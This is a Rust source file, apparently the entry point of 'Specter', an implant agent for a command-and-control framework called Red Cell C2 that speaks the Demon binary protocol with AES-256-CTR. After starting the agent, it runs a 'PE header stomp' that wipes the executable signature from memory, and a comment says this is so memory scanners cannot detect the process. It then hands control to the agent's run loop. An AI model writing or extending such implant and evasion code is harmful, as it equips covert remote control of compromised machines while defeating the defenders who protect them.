//! Specter — Rust Demon-compatible agent for Red Cell C2.
//!
//! Implements the Demon binary protocol (0xDEADBEEF magic, AES-256-CTR,
//! per-agent key exchange) for full compatibility with the Red Cell teamserver.

use tracing::{info, warn};
use tracing_subscriber::EnvFilter;

use specter::{SpecterAgent, SpecterConfig};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .init();

    info!("specter agent starting");

    let config = SpecterConfig::from_sources(std::env::args_os(), std::env::vars_os())?;
    let mut agent = SpecterAgent::new(config)?;

    // Erase the MZ/PE signature from the module image so that memory scanners
    // cannot identify this process as a Portable Executable by its header.
    //
    // Run after [`SpecterAgent::new`] so the primary HTTP `reqwest` client is
    // constructed before any code mutates the PE header page.
    if let Err(e) = specter::pe_stomp::stomp_pe_headers() {
        warn!("PE header stomp failed: {e}");
    }

    info!(agent_id = format_args!("0x{:08X}", agent.agent_id()), "agent ready");

    agent.run().await?;

    Ok(())
}
